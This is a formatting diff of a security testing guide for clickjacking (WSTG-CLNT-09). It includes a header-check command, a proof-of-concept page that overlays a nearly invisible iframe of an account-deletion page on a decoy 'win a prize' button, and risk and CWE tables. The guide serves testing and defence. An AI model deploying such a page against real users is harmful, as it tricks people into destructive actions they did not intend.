@@ -1,9 +1,11 @@
 # WSTG-CLNT-09: Testing for Clickjacking
 
 ## Test ID
+
 WSTG-CLNT-09
 
 ## Test Name
+
 Testing for Clickjacking
 
 ## High-Level Description
@@ -48,42 +50,42 @@ curl -sI "$TARGET" | grep -iE "x-frame-options|content-security-policy"
 ```html
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Clickjacking PoC</title>
     <style>
-        #target {
-            position: absolute;
-            width: 500px;
-            height: 400px;
-            opacity: 0.1;  /* Nearly invisible */
-            z-index: 2;
-        }
-        #decoy {
-            position: absolute;
-            width: 500px;
-            height: 400px;
-            z-index: 1;
-        }
-        #decoy button {
-            position: absolute;
-            top: 200px;
-            left: 150px;
-            padding: 20px 40px;
-            font-size: 20px;
-        }
+      #target {
+        position: absolute;
+        width: 500px;
+        height: 400px;
+        opacity: 0.1; /* Nearly invisible */
+        z-index: 2;
+      }
+      #decoy {
+        position: absolute;
+        width: 500px;
+        height: 400px;
+        z-index: 1;
+      }
+      #decoy button {
+        position: absolute;
+        top: 200px;
+        left: 150px;
+        padding: 20px 40px;
+        font-size: 20px;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Click to win a prize!</h1>
 
     <!-- Decoy content -->
     <div id="decoy">
-        <button>CLICK HERE TO WIN!</button>
+      <button>CLICK HERE TO WIN!</button>
     </div>
 
     <!-- Hidden iframe with target action -->
     <iframe id="target" src="https://target.com/settings/delete-account"></iframe>
-</body>
+  </body>
 </html>
 ```
 
@@ -187,17 +189,17 @@ add_header Content-Security-Policy "frame-ancestors 'self'" always;
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| No framing protection on sensitive page | 4.3 | Medium |
-| ALLOW-FROM (deprecated) | 3.5 | Low |
+| Finding                                 | CVSS | Severity |
+| --------------------------------------- | ---- | -------- |
+| No framing protection on sensitive page | 4.3  | Medium   |
+| ALLOW-FROM (deprecated)                 | 3.5  | Low      |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID       | Title                                      |
+| ------------ | ------------------------------------------ |
 | **CWE-1021** | Improper Restriction of Rendered UI Layers |
 
 ---
